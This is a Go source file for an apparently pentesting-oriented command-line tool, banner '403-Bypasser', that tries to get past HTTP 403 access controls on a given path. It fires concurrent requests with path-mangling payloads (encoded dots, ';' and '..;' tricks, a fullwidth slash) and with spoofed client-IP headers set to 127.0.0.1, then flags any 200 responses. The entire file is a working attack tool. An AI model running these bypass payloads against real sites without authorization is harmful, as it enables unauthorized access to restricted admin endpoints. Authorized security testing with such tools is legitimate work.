package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	reURL          = regexp.MustCompile("^https?://")
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Remote-IP",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-ProxyUser-Ip",
		"X-Remote-Addr",
	}
	Red   = Color("\033[1;31m%s\033[0m")
	Green = Color("\033[1;32m%s\033[0m")
	Blue  = Color("\033[1;34m%s\033[0m")
	Cyan  = Color("\033[1;36m%s\033[0m")
)

const (
	version string = "v1.1.1"
	red     string = "\033[31m"
	green   string = "\033[32m"
	white   string = "\033[97m"

	headerValue string = "127.0.0.1"
)

func Color(colorString string) func(...interface{}) string {
	sprint := func(args ...interface{}) string {
		return fmt.Sprintf(colorString,
			fmt.Sprint(args...))
	}
	return sprint
}

func showBanner() {
	fmt.Println(Green(
		" _  _    ___ ____        ____\n",
		"| || |  / _ \\___ \\      |  _ \\\n",
		"| || |_| | | |__) |_____| |_) |_   _ _ __   __ _ ___ ___  ___ _ __\n",
		"|__   _| | | |__ <______|  _ <| | | | '_ \\ / _` / __/ __|/ _ \\ '__|\n",
		"   | | | |_| |__) |     | |_) | |_| | |_) | (_| \\__ \\__ \\  __/ |\n",
		"   |_|  \\___/____/      |____/ \\__, | .__/ \\__,_|___/___/\\___|_|\n",
		"                                __/ | |\n",
		"                               |___/|_|                          ",
		version))
}

func getValidDomain(domain string) string {
	trimmedDomain := strings.TrimSpace(domain)

	if !reURL.MatchString(trimmedDomain) {
		trimmedDomain = "https://" + trimmedDomain
	}

	return trimmedDomain
}

func constructEndpointPayloads(domain, path string) []string {
	return []string{
		domain + "/" + strings.ToUpper(path),
		domain + "/" + path + "/",
		domain + "/" + path + "/.",
		domain + "//" + path + "//",
		domain + "/./" + path + "/./",
		domain + "/./" + path + "/..",
		domain + "/;/" + path,
		domain + "/.;/" + path,
		domain + "//;//" + path,
		domain + "/" + path + "..;/",
		domain + "/%2e/" + path,
		domain + "/%252e/" + path,
		domain + "/%ef%bc%8f" + path,
	}
}

func penetrateEndpoint(wg *sync.WaitGroup, url string, header ...string) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		log.Fatal(err)
	}

	var h string
	if header != nil {
		h = header[0]
		req.Header.Set(h, headerValue)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(Red(err))
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		log.Println(Red(h, " ", url, " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
	} else {
		log.Println(Green(h, " ", url, " (", resp.StatusCode, " ", http.StatusText(resp.StatusCode), ")"))
	}

}

func main() {
	runtime.GOMAXPROCS(1)

	domain := flag.String("url", "", "A domain with the protocol. Example: https://daffa.tech")
	path := flag.String("path", "", "An endpoint. Example: admin")
	flag.Parse()

	if *domain == "" || *path == "" {
		log.Fatalln("Using flag -url and -path")
	}

	validDomain := getValidDomain(*domain)
	validPath := strings.TrimSpace(*path)
	endpoints := constructEndpointPayloads(validDomain, validPath)

	showBanner()

	fmt.Println(Blue("\nDomain:", validDomain))
	fmt.Println(Blue("Path:", validPath))

	fmt.Println(Cyan("\nNormal Request"))

	var wg sync.WaitGroup
	wg.Add(len(endpoints))

	for _, e := range endpoints {
		go penetrateEndpoint(&wg, e)
	}

	wg.Wait()

	fmt.Println(Cyan("\nRequest with Headers"))
	wg.Add(len(headerPayloads))

	for _, h := range headerPayloads {
		go penetrateEndpoint(&wg, validDomain+"/"+validPath, h)
	}

	wg.Wait()
}
